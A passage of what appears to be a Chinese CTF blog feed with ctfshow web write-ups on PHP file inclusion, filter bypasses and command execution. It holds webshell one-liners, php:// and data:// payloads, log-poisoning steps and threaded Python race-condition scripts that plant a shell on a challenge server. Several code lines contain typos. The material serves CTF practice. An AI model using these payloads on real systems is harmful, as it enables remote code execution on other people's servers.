class=\"token operator\">%</span>e6<span class=\"token operator\">%</span>f3<span class=\"token operator\">%</span>e8<span class=\"token operator\">%</span>ef<span class=\"token operator\">%</span>f7<span class=\"token operator\">%</span>df<span class=\"token operator\">%</span>e6<span class=\"token operator\">%</span>ec<span class=\"token operator\">%</span>b0<span class=\"token operator\">%</span>e7<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h1 id=\"web-149\"><a class=\"anchor\" href=\"#web-149\">#</a> web 149</h1>\n<p>覆盖 index.php</p>\n<p>payload：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>?ctf=index.php </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>POST:show=<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span></pre></td></tr></tbody></table></figure><h1 id=\"web-150\"><a class=\"anchor\" href=\"#web-150\">#</a> web 150</h1>\n<p>日志包含</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span></pre></td></tr></tbody></table></figure><p>然后利用 ctf 传参，传入日志的路径，使日志被访问</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>ctf=/var/log/nginx/access.log</pre></td></tr></tbody></table></figure><p>设置 isVIP 的值为 1，使最下面的 if 条件成立</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>?isVIP=1</pre></td></tr></tbody></table></figure><h1 id=\"web-150-plus\"><a class=\"anchor\" href=\"#web-150-plus\">#</a> web 150-plus</h1>\n<p><code>__autoload()</code> <br>\n 当第一次使用一个类 A 时，如果找不到，会自动调用 <code>__autoload()</code>  方法，并将类名 <code>A</code>  作为参数传入，我们在 <code>__autoload()</code>  中需要的做的就是根据类名，找到相应的文件，并包含进来。</p>\n<p>本题中 <code>class_exists()</code>  类是第一次使用，可以通过对它的使用来调用  <code>autoload ()</code>  这个魔术方法输出变量 <code>$class</code></p>\n<p>过滤掉了 <code>_</code> ，可以通过 <code>…</code>  绕过</p>\n<p>因为题中有 <code>extract</code>  函数，会将传入的数组解析掉，所以 get 传入： <code>?..CTFSHOW…=phpinfo</code></p>\n<p><code>phpinfo()</code>  里面有 flag</p>\n<p>预期解：<strong>条件竞争</strong></p>\n<p><code>ctf=1.php</code></p>\n<p><code>show=&lt;?php system('tac /c*');?&gt;</code></p>\n<p>使用 bp 不断访问并传参，然后开一个去不断访问 1.php</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/31915a1e/",
            "url": "http://dpm12345.cn/posts/31915a1e/",
            "title": "文件包含",
            "date_published": "2022-10-04T14:12:40.000Z",
            "content_html": "<h1 id=\"web-78\"><a class=\"anchor\" href=\"#web-78\">#</a> web 78</h1>\n<p>php 伪协议</p>\n<h1 id=\"web-79\"><a class=\"anchor\" href=\"#web-79\">#</a> web 79</h1>\n<p>data 伪协议 <code>data://text/plain,&lt;?=eval($_POST[1]);?&gt;</code></p>\n<h1 id=\"web-80\"><a class=\"anchor\" href=\"#web-80\">#</a> web 80</h1>\n<p>data 协议被禁用</p>\n<p>可以尝试日志包含</p>\n<p><code>&lt;?php eval($_POST[1]);?&gt;</code></p>\n<h1 id=\"web-82\"><a class=\"anchor\" href=\"#web-82\">#</a> web 82</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#coding=utf-8</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> io</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>sessid <span class=\"token operator\">=</span> <span class=\"token string\">'TGAO'</span>          <span class=\"token comment\">#sessionid 值，也为控制的文件名</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"system('whoami');\"</span><span class=\"token punctuation\">}</span>         <span class=\"token comment\">#进行的命令</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 写文件</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        f <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>BytesIO<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">1024</span> <span class=\"token operator\">*</span> <span class=\"token number\">50</span><span class=\"token punctuation\">)</span>      <span class=\"token comment\">#写入的文件内容</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        resp <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span> <span class=\"token string\">'http://127.0.0.1:5555/test56.php'</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'&lt;?php eval($_POST[\"cmd\"]);?&gt;'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> files<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'tgao.txt'</span><span class=\"token punctuation\">,</span>f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> cookies<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">'PHPSESSID'</span><span class=\"token punctuation\">:</span> sessid<span class=\"token punctuation\">}</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">#'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval ($_POST [\"cmd\"]);?&gt;' 为一句话木马</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\"># files={'file': ('tgao.txt',f)} 为上传的文件</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token comment\"># cookies={'PHPSESSID': sessid}，设置 sessid，控制文件名</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># 读文件</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        resp <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">'http://127.0.0.1:5555/test56.php?file=session/sess_'</span><span class=\"token operator\">+</span>sessid<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">'tgao.txt'</span> <span class=\"token keyword\">in</span> resp<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            event<span class=\"token punctuation\">.</span>clear<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+++++++++++++]retry\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    event<span class=\"token operator\">=</span>threading<span class=\"token punctuation\">.</span>Event<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">with</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> session<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">xrange</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>write<span class=\"token punctuation\">,</span>args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">xrange</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>read<span class=\"token punctuation\">,</span>args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    event<span class=\"token punctuation\">.</span><span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> io</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">' http://4c773cea-91fa-498e-8027-46bab5889b16.challenge.ctf.show:8080/'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>sessionid <span class=\"token operator\">=</span> <span class=\"token string\">'ctfshow'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"file_put_contents( '/var/www/html/2.php','&lt;?php eval($_ POST[2]);?&gt;');\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    fileBytes <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>BytesI0<span class=\"token punctuation\">(</span><span class=\"token string\">b' a'</span><span class=\"token operator\">*</span><span class=\"token number\">1024</span><span class=\"token operator\">*</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        response <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                                data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                                    <span class=\"token string\">' PHP_SESSION_UPLOAD_PROGRESS'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'&lt;?php eval($_ POST[1]);?&gt;'</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                                cookies<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                                    <span class=\"token string\">' PHPSESSID'</span><span class=\"token punctuation\">:</span> sessionid</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                                files<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                                    <span class=\"token string\">'file'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'ctfshow.jpg '</span><span class=\"token punctuation\">,</span> fileBytes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                                <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                                <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        response <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> <span class=\"token string\">'?file=/tmp/sess_'</span> <span class=\"token operator\">+</span> sessionid<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                                cookies<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                                    <span class=\"token string\">'PHPSESSID'</span><span class=\"token punctuation\">:</span> sessionid</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                                <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                                <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        resposne2 <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> <span class=\"token string\">'2.php '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">if</span> resposne2<span class=\"token punctuation\">.</span>status_code <span class=\"token operator\">==</span> <span class=\"token number\">200</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'++++++done++++++'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>resposne2<span class=\"token punctuation\">.</span>status_code<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    evnet <span class=\"token operator\">=</span> threading <span class=\"token punctuation\">.</span> Event<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">with</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> session<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            threading<span class=\"token punctuation\">.</span> Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>write<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            threading<span class=\"token punctuation\">.</span> Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>read<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>evnet<span class=\"token punctuation\">.</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><h1 id=\"web-83-84\"><a class=\"anchor\" href=\"#web-83-84\">#</a> web 83 /84</h1>\n<p>83 使用了</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">session_unset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>session_destroy<span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>84 使用了</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"rm -rf /tmp/*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>但都可以用 82 脚本跑出，第一个为脚本中 session 的设置，第二个为线程的作用，刚删但刚写</p>\n<h1 id=\"web-85\"><a class=\"anchor\" href=\"#web-85\">#</a> web 85</h1>\n<p>虽然有对内容 \"&lt;\" 的判断，但还是可以通过上面代码进行，增加线程即可</p>\n<h1 id=\"web-87\"><a class=\"anchor\" href=\"#web-87\">#</a> web 87</h1>\n<p>改为写文件了，可以使用过滤器</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/write=string.rot13/resource=2.php</span></pre></td></tr></tbody></table></figure><p>因为是对 file 的解码，因此对 file 的内容进行两次 url 编码，上传后，访问 2.php 文件即可</p>\n<h1 id=\"web-88\"><a class=\"anchor\" href=\"#web-88\">#</a> web 88</h1>\n<p>data 协议，base64 编码，构造出不带 =，+ 号的编码</p>\n<p><code>data://text/plain;base64,&lt;?php system('ls');?&gt;</code></p>\n<h1 id=\"web-117\"><a class=\"anchor\" href=\"#web-117\">#</a> web 117</h1>\n<p>伪协议，过滤器，死亡绕过</p>\n<p>通过转码使得院死亡代码无效，使自己的代码有效</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span></pre></td></tr></tbody></table></figure>",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/b013ba57/",
            "url": "http://dpm12345.cn/posts/b013ba57/",
            "title": "信息收集 爆破 命令执行",
            "date_published": "2022-10-04T14:11:40.000Z",
            "content_html": "<h1 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h1>\n<ol>\n<li>robots #</li>\n<li>域名解析 #</li>\n<li>.git <code>.svn</code> .swp</li>\n<li>editor 编辑器 如果访问一个不存在的目录，那么会列出根目录的所有文件</li>\n<li>邮箱 qq 号泄漏部分信息</li>\n<li>探针访问默认的 tz.php</li>\n<li>ip 访问，cdn 缓存清除 / 绕过，可加 www 绕过</li>\n<li>Unicode 编码（可使用控制台输出)</li>\n<li>前端密码验证 可以绕过前端 js 直接 post 传入</li>\n<li>access 数据库 db 目录下的 data.mdb db.mdb</li>\n<li></li>\n</ol>\n<h1 id=\"爆破\"><a class=\"anchor\" href=\"#爆破\">#</a> 爆破</h1>\n<ol>\n<li>域名爆破子域名 <span class=\"exturl\" data-url=\"aHR0cDovL3BocGluZm8ubWUv\">phpinfo.me</span></li>\n<li>php_mt_seed</li>\n<li>\\uxx 可以用 consoleolog</li>\n<li></li>\n</ol>\n<h1 id=\"命令执行\"><a class=\"anchor\" href=\"#命令执行\">#</a> 命令执行</h1>\n<h2 id=\"linux-中的-cp-命令\"><a class=\"anchor\" href=\"#linux-中的-cp-命令\">#</a> Linux 中的 cp 命令</h2>\n<p>利用 cp 命令将 flag.php 写入 1.txt，然后访问 1.txt</p>\n<p><code>system (\"cp fla?.php 1.txt\");</code> (对 flag 进行过滤)（mv 也行）</p>\n<h2 id=\"system-过滤可以使用反引号绕过反引号作用相当于-system\"><a class=\"anchor\" href=\"#system-过滤可以使用反引号绕过反引号作用相当于-system\">#</a> system 过滤可以使用反引号绕过，反引号作用相当于 system</h2>\n<h2 id=\"嵌套-eval主要用于过滤了相应查找的函数\"><a class=\"anchor\" href=\"#嵌套-eval主要用于过滤了相应查找的函数\">#</a> 嵌套 eval，主要用于过滤了相应查找的函数</h2>\n<p>payload: <code>?a=eval($_GET[1]);&amp;1=phpinfo();</code></p>\n<p>其中  <code>1</code>  已经逃逸，可以使用任何命令</p>\n<p>(可以使用 system (\"tac flag.php\") 直接查看源码)(tac 为 cat 的逆序)</p>\n<h2 id=\"分号被-ban\"><a class=\"anchor\" href=\"#分号被-ban\">#</a> 分号被 ban</h2>\n<p>可以使用文件包含的方法， <code>include%0a$_GET [1]&amp;1=phpinfo();</code></p>\n<p>此时 1 已经逃逸，若想查看文件内容，可使用 php 伪协议，base-64 编码查看 (同时可以把 include 换成 require)</p>\n<h2 id=\"data-协议\"><a class=\"anchor\" href=\"#data-协议\">#</a> data 协议</h2>\n<p><code>data://text/plain,(php代码)</code></p>\n<h2 id=\"web-40\"><a class=\"anchor\" href=\"#web-40\">#</a> web 40</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>可用 <code>show_source(next(array_reverse(scandir(pos(loc)lecony))));</code></p>\n<p>或者 <code>?c=eval(arry_pop(next(get_difined_vars())));</code></p>\n<p>其中  <code>get_defined_vars()</code> , 获取所有的变量值，之前可以进行打印，可以发现有 post 传值，传入后会有显示，那么需要拿到传上的值，</p>\n<p>由于 post 在第二个，可用 next 获取下一个， <code>array_pop()</code>  弹出，然后使用 <code>eval</code>  执行</p>\n<p>执行过程</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/web40_1.png\" alt=\"\"></p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/web40_2.png\" alt=\"\"></p>\n<p>可看到由于传值，使得 post 有值了</p>\n<p>那么接下来就是获取并执行</p>\n<h2 id=\"web-41\"><a class=\"anchor\" href=\"#web-41\">#</a> web 41</h2>\n<p>这个题过滤了 <code>$、+、-、^、~</code>  使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符 |。</p>\n<p>我们可以尝试从 ascii 为 0-255 的字符中，找到或运算能得到我们可用的字符的字符。</p>\n<p>这里先给出两个脚本 <code>exp.py``rce_or.php</code> ，大家以后碰到可以使用或运算绕过的可以自己手动修改下即可。</p>\n<p>生成可用字符的集合</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$myfile</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"rce_or.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"w\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$contents</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token 